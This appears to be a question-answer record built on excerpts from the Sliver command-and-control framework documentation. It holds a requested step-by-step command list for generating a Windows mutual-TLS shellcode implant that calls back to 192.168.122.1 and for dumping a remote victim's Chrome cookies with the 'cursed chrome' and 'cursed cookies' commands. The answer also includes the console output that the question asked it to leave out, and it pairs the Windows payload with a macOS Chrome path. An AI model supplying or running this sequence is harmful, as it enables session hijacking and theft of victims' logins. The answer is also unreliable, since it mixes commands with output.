Context:## Cursed Chrome
## Cursed Edge
## Cursed Electron
## Cursed Console
## Cursed Cookies
Starting in v1.5.28 the `cursed cookies` command can be used to dump a remote cursed process' cookies to a local file (newline delimited json), for example:
# Payload Generation on Sliver for Windows

Here are some  commands for generating payloads on Sliver, specifically targeting Windows.

## Generating a Windows Shellcode Payload
Create a new profile called `win-shellcode` that uses mutual TLS and connects to the server IP **192.168.122.1** in **shellcode** format.
```bash
sliver > profiles new --mtls 192.168.122.1 --format shellcode win-shellcode
```
```
[server] sliver (CHRONIC_GOAT) > cursed chrome

...

[server] sliver (CHRONIC_GOAT) > cursed cookies

? Select a curse: 44199  [Session 56a5cd6f]  /Applications/Google Chrome.app/Contents/MacOS/Google Chrome

[*] Successfully dumped 437 cookies
[*] Saved to cookies-20220925182151.json

```

 Question: Provide *only* the commands to generate a *Windows payload with Sliver*, establish a session, and extract cookies using the *cursed chrome* and *cursed cookies* commands in Sliver. Format the response as a list of commands in the exact order required \n - generate\n -curded chrome \n -cursed cookie \n Exclude any explanations or additional text and exclude the bash output, return me only the bash command. 

 Your response: 
```
sliver > profiles new --mtls 192.168.122.1 --format shellcode win-shellcode
[server] sliver (CHRONIC_GOAT) > cursed chrome
[server] sliver (CHRONIC_GOAT) > cursed cookies
? Select a curse: 44199  [Session 56a5cd6f]  /Applications/Google Chrome.app/Contents/MacOS/Google Chrome
[*] Successfully dumped 437 cookies
[*] Saved to cookies-20220925182151.json
```